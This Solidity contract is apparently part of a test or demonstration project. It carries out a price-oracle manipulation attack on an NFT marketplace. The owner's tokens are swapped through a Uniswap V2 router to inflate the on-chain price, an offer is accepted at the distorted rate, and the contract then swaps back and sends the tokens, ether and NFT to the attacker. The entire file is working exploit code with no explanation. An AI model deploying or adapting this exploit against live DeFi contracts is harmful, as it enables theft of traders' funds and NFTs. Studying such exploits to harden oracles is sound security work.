// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

// Uncomment this line to use console.log
import "hardhat/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";

import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";

import "../OnChain/NftMarketplace_PriceOracle_OnChain_v1.sol";
import "../Tokens/MockWETH.sol";

contract AttackerOnChianV1 {

    address private _owner;

    constructor(){
        _owner = msg.sender;
    }

    function attack(
        address router, 
        address market, 
        address token, 
        address weth, 
        address nft, 
        uint256 ownerTokenBalance,
        uint256 nftId,
        uint256 nftPriceInx,
        uint256 offerId
    ) external payable {
        /// Pull token from owner
        IERC20(token).transferFrom(_owner, address(this), ownerTokenBalance);
        /// Swap INX to WETH to inflate the price
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = token;
        path[1] = weth;
        IERC20(token).approve(router, tokenBalance);
        IUniswapV2Router01(router).swapExactTokensForTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp + 100
        );
        uint256 receiveBalance = IERC20(weth).balanceOf(address(this));
        /// Accept the offer
        uint256 nftPriceWeth = NftMarketplace_PriceOracle_OnChain_v1(market).convertToWETHAmount(token, nftPriceInx);
        MockWETH(weth).deposit{value: nftPriceWeth}();
        MockWETH(weth).approve(market, nftPriceWeth);
        NftMarketplace_PriceOracle_OnChain_v1(market).acceptOffer(nft, offerId, true);
        /// Swap WETH back to INX
        path[0] = weth;
        path[1] = token;
        IERC20(weth).approve(router, receiveBalance);
        IUniswapV2Router01(router).swapExactTokensForTokens(
            receiveBalance,
            0,
            path,
            address(this),
            block.timestamp + 100
        );
        /// Send tokens and NFT to owner
        tokenBalance = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(_owner, tokenBalance);
        (bool sent, ) = _owner.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
        IERC721(nft).transferFrom(address(this), _owner, nftId);
    }

    function onERC721Received(address,address,uint256,bytes memory) external returns(bytes4){
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }

}